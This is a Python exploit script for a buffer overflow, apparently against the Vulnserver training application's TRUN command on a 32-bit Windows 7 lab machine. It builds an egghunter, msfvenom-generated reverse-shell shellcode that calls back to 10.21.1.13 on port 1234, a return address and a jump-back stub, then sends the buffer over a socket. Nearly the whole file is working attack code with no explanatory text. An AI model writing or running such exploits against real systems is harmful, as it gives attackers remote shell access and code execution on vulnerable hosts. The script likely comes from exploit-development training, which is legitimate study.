#!/usr/bin/python
import os, sys, socket

ip = "10.21.1.15"
port = 9999

# Tested on a 32-bit Windows 7 machine
# Windows Defender disabled. 

# Badchars: \x00

hunter = (
"\x66\x81\xca\xff\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x8b\xfa"
"\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
)

# msfvenom -p windows/shell_reverse_tcp LHOST=10.21.1.13 LPORT=1234 -b '\x00' -f python -v shellcode

shellcode = ("\xd9\xe8\xd9\x74\x24\xf4\x5e\x31\xc9\xbb\xec\x25\x26\x8e\xb1"
"\x52\x83\xee\xfc\x31\x5e\x13\x03\xb2\x36\xc4\x7b\xb6\xd1\x8a"
"\x84\x46\x22\xeb\x0d\xa3\x13\x2b\x69\xa0\x04\x9b\xf9\xe4\xa8"
"\x50\xaf\x1c\x3a\x14\x78\x13\x8b\x93\x5e\x1a\x0c\x8f\xa3\x3d"
"\x8e\xd2\xf7\x9d\xaf\x1c\x0a\xdc\xe8\x41\xe7\x8c\xa1\x0e\x5a"
"\x20\xc5\x5b\x67\xcb\x95\x4a\xef\x28\x6d\x6c\xde\xff\xe5\x37"
"\xc0\xfe\x2a\x4c\x49\x18\x2e\x69\x03\x93\x84\x05\x92\x75\xd5"
"\xe6\x39\xb8\xd9\x14\x43\xfd\xde\xc6\x36\xf7\x1c\x7a\x41\xcc"
"\x5f\xa0\xc4\xd6\xf8\x23\x7e\x32\xf8\xe0\x19\xb1\xf6\x4d\x6d"
"\x9d\x1a\x53\xa2\x96\x27\xd8\x45\x78\xae\x9a\x61\x5c\xea\x79"
"\x0b\xc5\x56\x2f\x34\x15\x39\x90\x90\x5e\xd4\xc5\xa8\x3d\xb1"
"\x2a\x81\xbd\x41\x25\x92\xce\x73\xea\x08\x58\x38\x63\x97\x9f"
"\x3f\x5e\x6f\x0f\xbe\x61\x90\x06\x05\x35\xc0\x30\xac\x36\x8b"
"\xc0\x51\xe3\x1c\x90\xfd\x5c\xdd\x40\xbe\x0c\xb5\x8a\x31\x72"
"\xa5\xb5\x9b\x1b\x4c\x4c\x4c\x2e\x84\x4f\x81\x46\xa4\x4f\x9d"
"\x44\x21\xa9\xf7\x78\x64\x62\x60\xe0\x2d\xf8\x11\xed\xfb\x85"
"\x12\x65\x08\x7a\xdc\x8e\x65\x68\x89\x7e\x30\xd2\x1c\x80\xee"
"\x7a\xc2\x13\x75\x7a\x8d\x0f\x22\x2d\xda\xfe\x3b\xbb\xf6\x59"
"\x92\xd9\x0a\x3f\xdd\x59\xd1\xfc\xe0\x60\x94\xb9\xc6\x72\x60"
"\x41\x43\x26\x3c\x14\x1d\x90\xfa\xce\xef\x4a\x55\xbc\xb9\x1a"
"\x20\x8e\x79\x5c\x2d\xdb\x0f\x80\x9c\xb2\x49\xbf\x11\x53\x5e"
"\xb8\x4f\xc3\xa1\x13\xd4\xe3\x43\xb1\x21\x8c\xdd\x50\x88\xd1"
"\xdd\x8f\xcf\xef\x5d\x25\xb0\x0b\x7d\x4c\xb5\x50\x39\xbd\xc7"
"\xc9\xac\xc1\x74\xe9\xe4")

# EIP: 625011AF 
eip = "\xaf\x11\x50\x62"
jumpBack = "\xEB\xCE\x90\x90"

stage2 = "w00tw00t" + shellcode 
stage1 = stage2 + "A"* (2003-len(stage2)-len(hunter)-5) + hunter + "A" * 5 + eip + jumpBack

command = "TRUN /.:/"

buffer = command + stage1

exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exploit.connect((ip, port))
exploit.send(buffer)
exploit.close()